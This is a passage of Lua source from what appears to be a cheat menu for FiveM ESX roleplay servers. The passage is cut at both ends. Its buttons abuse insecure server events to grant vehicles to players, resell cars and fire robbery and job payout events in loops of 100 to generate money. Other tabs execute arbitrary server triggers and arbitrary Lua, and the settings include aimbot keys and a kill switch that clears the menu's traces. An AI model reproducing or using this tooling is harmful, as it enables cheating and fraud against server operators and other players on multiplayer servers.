                                self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_vehicleshop"]["esx_vehicleshop:setVehicleOwnedPlayerId"], self:GetFunction("GetPlayerServerId")(self.SelectedPlayer), props, model, model)
   
                                self:AddNotification("SUCCESS", "Gave vehicle to player.", 5000)
   
                            end
   
                        end
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
    
   
                if self.Painter:Button("SELL CURRENT VEHICLE ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "sell_current_owned") then
   
                    local curVeh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
                    if not self:GetFunction("DoesEntityExist")(curVeh) or self:GetFunction("GetPedInVehicleSeat")(curVeh, -1) ~= self.LocalPlayer then
   
                        self:AddNotification("ERROR", "You must be in a vehicle to use this!", 5000)
   
                    else
   
                        if not self.ESX then
   
                            self:AddNotification("ERROR", "Could not get reference to ESX object.", 5000)
   
                        else
   
                            local props = self.ESX.Game.GetVehicleProperties(curVeh)
   
                            local model = GetDisplayNameFromVehicleModel(props.model)
   
                            self.ESX.TriggerServerCallback(self.DynamicTriggers["esx_vehicleshop"]["esx_vehicleshop:resellVehicle"], function(sold) end, props.plate, props.model)
   
                            self:AddNotification("SUCCESS", "Sold vehicle.", 5000)
   
                        end
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if self.DynamicTriggers["esx_vangelico_robbery"] then
   
                if self.Painter:Button("VANGELICO ROBBERY ~g~ESX ($$$)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "steal_jewels") then
   
                    self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_vangelico_robbery"]["esx_vangelico_robbery:gioielli"])
   
                    self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_vangelico_robbery"]["esx_vangelico_robbery:gioielli1"])
   
                    Wait(100)
   
                    self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_vangelico_robbery"]["lester:vendita"])
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if resource_list["esx_jewelrobbery"] then
   
                if self.Painter:Button("JEWEL ROBBERY ~g~ESX ($$$)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "steal_jewel_robbery") then
   
                    for i = 1, 20 do
   
                        self:GetFunction("TriggerServerEvent")("esx_JewelRobbery:setcase", i, true)
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if resource_list["disc-base"] then
   
                if self.Painter:Button("DISC BASE ~g~ESX ($$$)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "disc_base") then
   
                    for i = 1, 100 do
   
                        self:GetFunction("TriggerServerEvent")("disc-base:givePlayerMoney", 1000)
   
                        Wait(10)
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if resource_list["esx_burglary"] then
   
                if self.Painter:Button("BURGLARY ~g~ESX ($$$)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_burglary") then
   
                    for i = 1, 100 do
   
                        self:GetFunction("TriggerServerEvent")("burglary:money", 1000)
   
                        Wait(10)
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if resource_list["esx_garbage"] then
   
                if self.Painter:Button("GARBAGE ~g~ESX ($$$)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_garbage") then
   
                    for i = 1, 100 do
   
                        self:GetFunction("TriggerServerEvent")("esx_garbage:pay", 1000)
   
                        Wait(10)
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if resource_list["esx_prisonwork"] then
   
                if self.Painter:Button("PRISON WORK ~g~ESX ($$$)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_garbage") then
   
                    for i = 1, 100 do
   
                        self:GetFunction("TriggerServerEvent")("esx_loffe_fangelse:Pay")
   
                        Wait(10)
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
        end)
   
    
   
        AREF:AddCategory("Freecam", function(self, x, y)
   
            local curY = 5
   
    
   
            if self.Painter:CheckBox("FREECAM", self.FreeCam.On, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "freecam") then
   
                self.FreeCam.On = not self.FreeCam.On
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 20
   
    
   
            if self.Painter:ListChoice("FREECAM MODE: ", self.FreeCam.ModeNames, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "freecam_mode") then
   
                self.FreeCam.Mode = list_choices["freecam_mode"].selected
   
                self.FreeCam.DraggingEntity = nil
   
                lift_height = 0.0
   
                lift_inc = 0.1
   
                self.ConfigClass.Save(true)
   
            end
   
        end)
   
    
   
        local keys = {"TAB", "MOUSE3", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "F1", "F2", "F3", "F5", "F6", "F7", "F8", "F9", "F10"}
   
        local disable_keys = {"-", "MOUSE3", "TAB", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F5", "F6", "F7", "F8", "F9", "F10"}
   
        local freecam_keys = {"HOME", "MOUSE3", "TAB", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F5", "F6", "F7", "F8", "F9", "F10"}
   
        local rccar_keys = {"=", "MOUSE3", "TAB", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F5", "F6", "F7", "F8", "F9", "F10"}
   
        local aimbot_keys = {"MOUSE1", "MOUSE2", "MOUSE3", "LEFTALT", "LEFTSHIFT", "MOUSE2", "SPACE", "CAPS", "C", "X", "Z", "V", "F", "G", "H", "E", "R", "Q", "T", "Y", "U", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
   
    
   
        local function _run_lua(resource, trigger)
   
            local args = AREF:GetTextInput("Enter Arguments.", "", 100)
   
            local _args
   
    
   
            if not args or args == "" then
   
                _args = {}
   
            else
   
                local e, r = load("return {" .. args .. "}")
   
    
   
                if e then
   
                    _args = e()
   
                else
   
                    AREF:AddNotification("ERROR", "Execution failed. See console for details.")
   
                    AREF:Print("[LUA] Execution Failed (Arguments): ^1" .. r .. "^7")
   
                end
   
            end
   
    
   
            if dict.type(_args) == "table" then
   
                local amount = AREF:GetTextInput("Enter repetitions.", 1, 10)
   
    
   
                if not amount or not dict.tonumber(amount) then
   
                    amount = 1
   
                end
   
    
   
                amount = dict.tonumber(amount)
   
                local _type = AREF:GetTextInput("Enter method. [CL/SV]", "SV", 2)
   
    
   
                if _type == "CL" then
   
                    for i = 1, amount do
   
                        AREF:GetFunction("TriggerEvent")(((not resource) and trigger or (AREF.DynamicTriggers[resource][trigger])), dict.table.unpack(_args))
   
                    end
   
    
   
                    AREF:AddNotification("INFO", "[CL] Running " .. ((not resource) and trigger or (AREF.DynamicTriggers[resource][trigger])) .. " " .. amount .. " time(s)")
   
                elseif _type == "SV" then
   
                    for i = 1, amount do
   
                        AREF:GetFunction("TriggerServerEvent")(((not resource) and trigger or (AREF.DynamicTriggers[resource][trigger])), dict.table.unpack(_args))
   
                    end
   
    
   
                    AREF:AddNotification("INFO", "[SV] Running " .. ((not resource) and trigger or (AREF.DynamicTriggers[resource][trigger])) .. " " .. amount .. " time(s)")
   
                else
   
                    AREF:AddNotification("ERROR", "Bad type.")
   
                end
   
            end
   
        end
   
    
   
        AREF:AddCategory("Lua", function(self, x, y)
   
            local curY = 0
   
    
   
            for resource, events in dict.pairs(self.DynamicTriggers) do
   
                for trigger, real in dict.pairs(events) do
   
                    local _trigger = self.Painter:Button(trigger, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "dynamic_trigger_" .. trigger)
   
    
   
                    if _trigger then
   
                        _run_lua(resource, trigger)
   
                    end
   
    
   
                    curY = curY + 25
   
                end
   
            end
   
    
   
            if self.Painter:CheckBox("SHOW KEYS PRESSED", self.Config.ShowControlsOnScreen, x, y, 5, self.MenuH - 105, nil, 20, 255, 255, 255, 255, "onscreen_controls", false, 0.38) then
   
                self.Config.ShowControlsOnScreen = not self.Config.ShowControlsOnScreen
   
            end
   
    
   
            local custom = self.Painter:Button("EXECUTE TRIGGER", x, y, 5, self.MenuH - 80, nil, 20, 255, 255, 255, 255, "execute_custom")
   
    
   
            if custom then
   
                local event = self:GetTextInput("Enter trigger.", "", 100)
   
    
   
                if event and event ~= "" then
   
                    _run_lua(nil, event)
   
                end
   
            end
   
    
   
            local custom_lua = self.Painter:Button("EXECUTE LUA", x, y, 545, self.MenuH - 80, nil, 20, 255, 255, 255, 255, "execute_custom_lua")
   
    
   
            if custom_lua then
   
                local code = self:GetTextInput("Enter lua code.", "", 2000)
   
    
   
                if code then
   
                    local e, r = load(code, nil, "t", _unpack({
   
                        FM = FM
   
                    }))
   
    
   
                    if e then
   
                        e()
   
                    else
   
                        self:AddNotification("ERROR", "Execution failed. See console for details.")
   
                        self:Print("[LUA] Execution Failed: ^1" .. r .. "^7")
   
                    end
   
                end
   
            end
   
        end)
   
    
   
        local selected_config = "none"
   
    
   
        AREF:AddCategory("Misc", function(self, x, y, w, h)
   
            local curY = 5
   
            local _width = self.Painter:GetTextWidth("Your build does not support to use of configs.", 4, 0.4)
   
            if _Executor ~= "redENGINE" then return self.Painter:DrawText("Your build does not support to use of configs.", 4, true, x + _width + 25, self.Config.MenuY + 100, 0.4, 255, 255, 255, 255) end
   
            _width = self.Painter:GetTextWidth("CURRENT CONFIG: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, current_config:upper()), 4, 0.4)
   
            self.Painter:DrawText("CURRENT CONFIG: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, current_config:upper()), 4, false, (x + w / 2) - (_width / 2), y + curY, 0.4, 255, 255, 255, 255)
   
            curY = curY + 25
   
            _width = self.Painter:GetTextWidth("SELECTED: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, selected_config:upper()), 4, 0.4)
   
            self.Painter:DrawText("SELECTED: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, selected_config:upper()), 4, false, (x + w / 2) - (_width / 2), y + curY, 0.4, 255, 255, 255, 255)
   
            curY = curY + 25
   
            local cl_w = self.Painter:GetTextWidth("NEW CONFIG", 4, 0.4)
   
    
   
            if self.Painter:Button("NEW CONFIG", x, y, 545, self.MenuH - 80, cl_w, 20, 255, 255, 255, 255, "new_config") then
   
                selected_config = "none"
   
                local name = self:GetTextInput("Enter the name of the new config.", "", 50)
   
    
   
                if name then
   
                    if not name:find("fm_") then
   
                        name = "fm_" .. name
   
                    end
   
    
   
                    self.List[name] = _count(self.List) + 1
   
                    self:SetConfigList()
   
                    self.ConfigClass.Write(name, self.DefaultConfig)
   
                    self:AddNotification("SUCCESS", "Config created.", 10000)
   
                end
   
            end
   
    
   
            for name, cfg in dict.pairs(self.List) do
   
                if self.Painter:Button("CONFIG: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, name:upper()), x, y, 5, curY, nil, 20, 255, 255, 255, 255, "config_" .. name) then
   
                    selected_config = name
   
                end
   
    
   
                if selected_config == name then
   
                    local curX = 5
   
                    local l_w = self.Painter:GetTextWidth("LOAD", 4, 0.4)
   
    
   
                    if self.Painter:Button("LOAD", x, y, curX, self.MenuH - 80, l_w, 20, 255, 255, 255, 255, "load_config") then
   
                        selected_config = "none"
   
                        current_config = name
   
                        self.ConfigClass.Load()
   
                    end
   
    
   
                    curX = curX + l_w + 5
   
                    local r_w = self.Painter:GetTextWidth("RESET", 4, 0.4)
   
    
   
                    if self.Painter:Button("RESET", x, y, curX, self.MenuH - 80, r_w, 20, 255, 255, 255, 255, "reset_config") then
   
                        selected_config = "none"
   
                        self.ConfigClass.Write(name, self.DefaultConfig)
   
                        self:AddNotification("SUCCESS", "Config reset.", 10000)
   
                    end
   
    
   
                    curX = curX + r_w + 5
   
                    local c_w = self.Painter:GetTextWidth("CLONE", 4, 0.4)
   
    
   
                    if self.Painter:Button("CLONE", x, y, curX, self.MenuH - 80, c_w, 20, 255, 255, 255, 255, "clone_config") then
   
                        selected_config = "none"
   
                        local name = self:GetTextInput("Enter the name of the config.", "", 50)
   
    
   
                        if name then
   
                            if not name:find("fm_") then
   
                                name = "fm_" .. name
   
                            end
   
    
   
                            self.List[name] = _count(self.List) + 1
   
                            self:SetConfigList()
   
                            self.ConfigClass.Write(name, self.Config)
   
                            self:AddNotification("SUCCESS", "Config cloned.", 10000)
   
                        end
   
                    end
   
    
   
                    curX = curX + c_w + 5
   
                    local rn_w = self.Painter:GetTextWidth("RENAME", 4, 0.4)
   
    
   
                    if self.Painter:Button("RENAME", x, y, curX, self.MenuH - 80, rn_w, 20, 255, 255, 255, 255, "rename_config") then
   
                        local old_name = name
   
                        local new_name = self:GetTextInput("Enter the name of the config.", "", 50)
   
    
   
                        if new_name then
   
                            if not new_name:find("fm_") then
   
                                new_name = "fm_" .. new_name
   
                            end
   
    
   
                            selected_config = new_name
   
                            self.List[new_name] = self.List[old_name] or (_count(self.List) + 1)
   
                            self.List[old_name] = nil
   
                            self:SetConfigList()
   
                            self.ConfigClass.Rename(old_name, new_name)
   
                            self:AddNotification("SUCCESS", "Config renamed.", 10000)
   
                        end
   
                    end
   
    
   
                    curX = curX + rn_w + 5
   
                    local d_w = self.Painter:GetTextWidth("DELETE", 4, 0.4)
   
    
   
                    if self.Painter:Button("DELETE", x, y, curX, self.MenuH - 80, d_w, 20, 255, 255, 255, 255, "delete_config") then
   
                        selected_config = "none"
   
                        current_config = "fm_default"
   
                        self.List[name] = nil
   
                        self.ConfigClass.Delete(name)
   
                        self:SetConfigList()
   
                        self.ConfigClass.Load()
   
                        self:AddNotification("SUCCESS", "Config deleted.", 10000)
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
        end)
   
    
   
        function AREF:IndexOf(table, val)
   
            for k, v in dict.pairs(table) do
   
                if v == val or k == val then return (v == val and k) or v end
   
            end
   
    
   
            return -1
   
        end
   
    
   
        AREF:AddCategory("Settings", function(self, x, y)
   
            local curY = 5
   
    
   
            if self.Painter:CheckBox("SHOW SCREEN TEXT", self.Config.ShowText, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "text_settings_enabled", false) then
   
                self.Config.ShowText = not self.Config.ShowText
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("SHOW NOTIFICATIONS", self.Config.ShowNotifications, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "show_notifications", false) then
   
                self.Config.ShowNotifications = not self.Config.ShowNotifications
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("MENU SOUNDS", self.Config.UseSounds, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "menu_sounds", false) then
   
                self.Config.UseSounds = not self.Config.UseSounds
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("AUTO MOVE WITH MENU OPEN", self.Config.UseAutoWalk, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "auto_walk_enabled", false) then
   
                self.Config.UseAutoWalk = not self.Config.UseAutoWalk
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("AUTO MOVE WITH FREECAM / RC CAR", self.Config.UseAutoWalkAlt, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "auto_walk_alt_enabled", false) then
   
                self.Config.UseAutoWalkAlt = not self.Config.UseAutoWalkAlt
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("SAFE MODE", self.Config.SafeMode, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "safe_mode", false) then
   
                self.Config.SafeMode = not self.Config.SafeMode
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("DRAW BACKGROUND IMAGE", self.Config.UseBackgroundImage, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "use_bg_image", false) then
   
                self.Config.UseBackgroundImage = not self.Config.UseBackgroundImage
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("USE PRINT MESSAGES", self.Config.UsePrintMessages, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "use_print_messages", false) then
   
                self.Config.UsePrintMessages = not self.Config.UsePrintMessages
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("DISABLE MOVEMENT CONTROLS", self.Config.DisableMovement, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "disable_movement", false) then
   
                self.Config.DisableMovement = not self.Config.DisableMovement
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 20
   
    
   
            if self.Painter:ListChoice("TOGGLE KEY: ", keys, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "toggle_key", self:IndexOf(keys, self.Config.ShowKey)) then
   
                self.Config.ShowKey = keys[list_choices["toggle_key"].selected]
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:ListChoice("DISABLE KEY: ", disable_keys, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "disable_key", self:IndexOf(disable_keys, self.Config.DisableKey), "DisableKey") then
   
                self.Config.DisableKey = disable_keys[list_choices["disable_key"].selected]
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:ListChoice("FREECAM KEY: ", freecam_keys, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "freecam_key", self:IndexOf(freecam_keys, self.Config.FreeCamKey), "FreeCamKey") then
   
                self.Config.FreeCamKey = freecam_keys[list_choices["freecam_key"].selected]
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:ListChoice("RC CAR CAM KEY: ", rccar_keys, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "rccar_key", self:IndexOf(rccar_keys, self.Config.RCCamKey), "RCCamKey") then
   
                self.Config.RCCamKey = rccar_keys[list_choices["rccar_key"].selected]
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:ListChoice("AIMBOT KEY: ", aimbot_keys, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "aimbot_key", self:IndexOf(aimbot_keys, self.Config.Player.AimbotKey)) then
   
                self.Config.Player.AimbotKey = aimbot_keys[list_choices["aimbot_key"].selected]
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:ListChoice("AIMBOT RELEASE KEY: ", aimbot_keys, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "aimbot_release_key", self:IndexOf(aimbot_keys, self.Config.Player.AimbotReleaseKey), "AimbotReleaseKey") then
   
                self.Config.Player.AimbotReleaseKey = aimbot_keys[list_choices["aimbot_release_key"].selected]
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("MENU COLOR: " .. self.Config.Tertiary[1] .. " " .. self.Config.Tertiary[2] .. " " .. self.Config.Tertiary[3], x, y, 5, curY, nil, 20, 255, 255, 255, 255, "menu_color") then
   
                local r = self:GetTextInput("Enter red value.", self.Config.Tertiary[1], 3)
   
    
   
                if not r or r == "" or not tonumber(r) then
   
                    self:AddNotification("ERROR", "Invalid red value.", 5000)
   
                else
   
                    local g = self:GetTextInput("Enter green value.", self.Config.Tertiary[2], 3)
   
    
   
                    if not g or g == "" or not tonumber(g) then
   
                        self:AddNotification("ERROR", "Invalid green value.", 5000)
   
                    else
   
                        local b = self:GetTextInput("Enter blue value.", self.Config.Tertiary[3], 3)
   
    
   
                        if not b or b == "" or not tonumber(b) then
   
                            self:AddNotification("ERROR", "Invalid blue value.", 5000)
   
                        else
   
                            r = self:Clamp(tonumber(r), 0, 255)
   
                            g = self:Clamp(tonumber(g), 0, 255)
   
                            b = self:Clamp(tonumber(b), 0, 255)
   
                            self.Config.Tertiary = {r, g, b, 255}
   
                            self.TertiaryHex = self:RGBToHex({r, g, b})
   
    
   
                            branding = {
   
                                name = "[" .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name) .. "~s~]",
   
                                resource = "Resource: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self:GetFunction("GetCurrentResourceName")()),
   
                                ip = "IP: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self:GetFunction("GetCurrentServerEndpoint")()),
   
                                id = "Server ID: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self:GetFunction("GetPlayerServerId")(self.NetworkID)),
   
                                veh = "Vehicle: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, "%s"),
   
                                build = (_Executor_Strings[_Executor] or "") .. " ~s~Build (" .. self.Build .. ")"
   
                            }
   
    
   
                            self.ConfigClass.Save(true)
   
                        end
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if dict.payload then
   
                if self.Painter:Button("EXECUTE ~g~ESX ~s~OBJECT PAYLOAD", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_object_payload") then
   
                    dict.payload()
   
                    dict.payload = nil
   
                end
   
            end
   
        end)
   
    
   
        AREF:AddCategory("~r~KILL", function(self, x, y)
   
            self.Showing = false
   
            self.FreeCam.On = false
   
            self.RCCar.On = false
   
            self.SpectatingPlayer = nil
   
    
   
            self.Config = {
   
                Binds = {},
   
                Player = {},
   
                Vehicle = {}
   
            }
   
    
   
            self:GetFunction("DestroyCam")(self.FreeCam.Cam)
   
            self:GetFunction("DestroyCam")(self.RCCar.Cam)
   
            self:GetFunction("DestroyCam")(self.SpectateCam)
   
            self:GetFunction("ClearPedTasks")(self.LocalPlayer)
   
            self:DoBlips(true)
   
            Wait(1)
   
            self.Enabled = false
   
        end)
   
    
   
        local scroller_pos
   
        local scroller_size
   
        local old_scroller
   
        local cur_count
   
        local scroller_max
   
    
   
        function AREF:GetScrollBasis(count)
   
            if count <= 30 then
   
                return 1.0
   
            elseif count <= 40 then
   
                return 1.1
   
            elseif count <= 50 then
   
                return 1.66
   
            elseif count <= 60 then
   
                return 2.22
   
            elseif count <= 70 then
   
                return 2.77
   
            elseif count <= 80 then
   
                return 3.33
   
            elseif count <= 90 then
   
                return 3.88
   
            elseif count <= 100 then
   
                return 4.45
   
            elseif count <= 110 then
   
                return 5.0
   
            else
   
                return count / 13.18
   
            end
   
        end
   
    
   
        local halt
   
    
   
        local title_color = {
   
            r = 255,
   
            g = 255,
   
            b = 255
   
        }
   
    
   
        local mode = 1
   
    
   
        local function _do_title_color()
   
            if mode == 1 then
   
                local r, g, b = _lerp(0.025, title_color.r, AREF.Config.Tertiary[1]), _lerp(0.025, title_color.g, AREF.Config.Tertiary[2]), _lerp(0.025, title_color.b, AREF.Config.Tertiary[3])
   
    
   
                if dict.math.abs(AREF.Config.Tertiary[1] - r) <= 3 and dict.math.abs(AREF.Config.Tertiary[2] - g) <= 3 and dict.math.abs(AREF.Config.Tertiary[3] - b) <= 3 then
   
                    mode = 2
   
                end
   
    
   
                title_color.r = r
   
                title_color.g = g
   
                title_color.b = b
   
            elseif mode == 2 then
   
                local r, g, b = _lerp(0.025, title_color.r, 255), _lerp(0.025, title_color.g, 255), _lerp(0.025, title_color.b, 255)
   
    
   
                if dict.math.abs(255 - r) <= 3 and dict.math.abs(255 - g) <= 3 and dict.math.abs(255 - b) <= 3 then
   
                    mode = 1
   
                end
   
    
   
                title_color.r = r
   
                title_color.g = g
   
                title_color.b = b
   
            end
   
        end
   
    
   
        function AREF:DrawMenu()
   
            _do_title_color()
   
    
   
            if self.Painter:Holding(self.Config.MenuX, self.Config.MenuY, self.MenuW, 15, "drag_bar") then
   
                self:GetFunction("SetMouseCursorSprite")(4)
   
                local x, y = self:TranslateMouse(self.Config.MenuX, self.Config.MenuY, self.MenuW, 15, "drag_bar")
   
                self.Config.MenuX = x
   
                self.Config.MenuY = y
   
            elseif was_dragging == "drag_bar" then
   
                self.DraggingX = nil
   
                self.DraggingY = nil
   
                was_dragging = nil
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            if self.Config.NotifX and self.Config.NotifY and self.Config.NotifW then
   
                if self.Painter:Holding(self.Config.NotifX, self.Config.NotifY, self.Config.NotifW, 30, "drag_notif") then
   
                    self:GetFunction("SetMouseCursorSprite")(4)
   
                    local x, y = self:TranslateMouse(self.Config.NotifX, self.Config.NotifY, self.Config.NotifW, 30, "drag_notif")
   
                    self.Config.NotifX = x
   
                    self.Config.NotifY = y
   
                elseif was_dragging == "drag_notif" then
   
                    self.DraggingX = nil
   
                    self.DraggingY = nil
   
                    was_dragging = nil
   
                    self.ConfigClass.Save(true)
   
                end
   
            end
   
    
   
            self:LimitRenderBounds()
   
    
   
            if self.Config.UseBackgroundImage then
   
                self.Painter:DrawSprite(self.Config.MenuX + (self.MenuW / 2), self.Config.MenuY + (self.MenuH / 2), self.MenuW, self.MenuH, 0.0, self.DuiName, "watermark", 255, 255, 255, 255, true)
   
            end
   
    
   
            self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY - 38, 90, 33, 10, 10, 10, 200)
   
            self.Painter:DrawText(self.Name, 4, false, self.Config.MenuX + 2, self.Config.MenuY - 37, 0.4, dict.math.ceil(title_color.r), dict.math.ceil(title_color.g), dict.math.ceil(title_color.b), 255)
   
            self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY, self.MenuW, self.MenuH, 0, 0, 0, 200)
   
            self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY, self.MenuW, 18, 30, 30, 30, 200)
   
            self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY + 16, self.MenuW, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], self.Config.Tertiary[4])
   
            self.Painter:DrawRect(self.Config.MenuX + 5, self.Config.MenuY + 23, 515 + 113, self.MenuH - 28, 10, 10, 10, 200)
   
            self.Painter:DrawRect(self.Config.MenuX + 525 + 111, self.Config.MenuY + 103, 280, self.MenuH - 108, 10, 10, 10, 200)
   
            self.Painter:DrawRect(self.Config.MenuX + 525 + 111, self.Config.MenuY + 65, 280, 35, 10, 10, 10, 200)
   
            self.Painter:DrawRect(self.Config.MenuX + 520 + 113, self.Config.MenuY + 23, 283, 39, 10, 10, 10, 200)
   
            local list_pos = {}
   
    
   
            if not self.SelectedPlayer or not self.Util:ValidPlayer(self.SelectedPlayer) then
   
                self.Painter:DrawText("Online Players: " .. #self.PlayerCache, 4, false, self.Config.MenuX + 530 + 113, self.Config.MenuY + 68, 0.35, 255, 255, 255, 255)
   
    
   
                if not scroller_pos then
   
                    scroller_pos = 0
   
                end
   
    
   
                local plyY = self.Config.MenuY + 101 - scroller_pos * self:GetScrollBasis(#self.PlayerCache)
   
                scroller_max = self.MenuH - 120
   
                scroller_size = old_scroller or scroller_max
   
    
   
                if cur_count ~= #self.PlayerCache then
   
                    scroller_size = scroller_max
   
                    old_scroller = nil
   
                end
   
    
   
                local _players = self.PlayerCache
   
                dict.table.sort(_players, sort_func)
   
    
   
                for id, src in dict.pairs(_players) do
   
                    list_pos[#list_pos + 1] = {
   
                        id = id,
   
                        src = src,
   
                        pos = dict.math.abs(self.Config.MenuY + 101 - plyY)
   
                    }
   
    
   
                    local color = dict.color_white
   
    
   
                    if dict.friends[self:GetFunction("GetPlayerServerId")(src)] then
   
                        color = dict.color_friend
   
                    end
   
    
   
                    if plyY >= (self.Config.MenuY + 92) and plyY <= (self.Config.MenuY + self.MenuH - 30) then
   
                        if self.Painter:Button("ID: " .. self:GetFunction("GetPlayerServerId")(src) .. " | Name: " .. self:CleanName(self:GetFunction("GetPlayerName")(src)), self.Config.MenuX + 525 + 113, plyY, 5, 5, nil, 20, color[1], color[2], color[3], 255, "player_" .. id, false, 0.35) then
   
                            self.SelectedPlayer = src
   
                        end
   
                    else
   
                        if not old_scroller then
   
                            scroller_size = self:Clamp(scroller_size - 23, 50, scroller_max)
   
                        end
   
                    end
   
    
   
                    plyY = plyY + 23
   
                end
   
    
   
                halt = false
   
    
   
                if not old_scroller then
   
                    old_scroller = scroller_size
   
                end
   
    
   
                if not cur_count then
   
                    cur_count = #self.PlayerCache
   
                end
   
    
   
                self.Painter:DrawRect(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108, 8, self.MenuH - 120, 20, 20, 20, 255)
   
                self.Painter:DrawRect(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108 + scroller_pos, 8, scroller_size, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], self.Config.Tertiary[4])
   
    
   
                if self.Painter:Hovered(self.Config.MenuX + 5 + 100 + 5 + 415 + 113, self.Config.MenuY + 103, 280, self.MenuH - 108) then
   
                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["MWHEELDOWN"]) then
   
                        scroller_pos = scroller_pos + 8
   
                        scroller_pos = self:Clamp(scroller_pos, 0, self.MenuH - 120 - scroller_size)
   
                    elseif self:GetFunction("IsDisabledControlPressed")(0, self.Keys["MWHEELUP"]) then
   
                        scroller_pos = scroller_pos - 8
   
                        scroller_pos = self:Clamp(scroller_pos, 0, self.MenuH - 120 - scroller_size)
   
                    end
   
                end
   
    
   
                if self.Painter:Holding(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108 + scroller_pos, 8, scroller_size, "scroll_bar") then
   
                    self:GetFunction("SetMouseCursorSprite")(4)
   
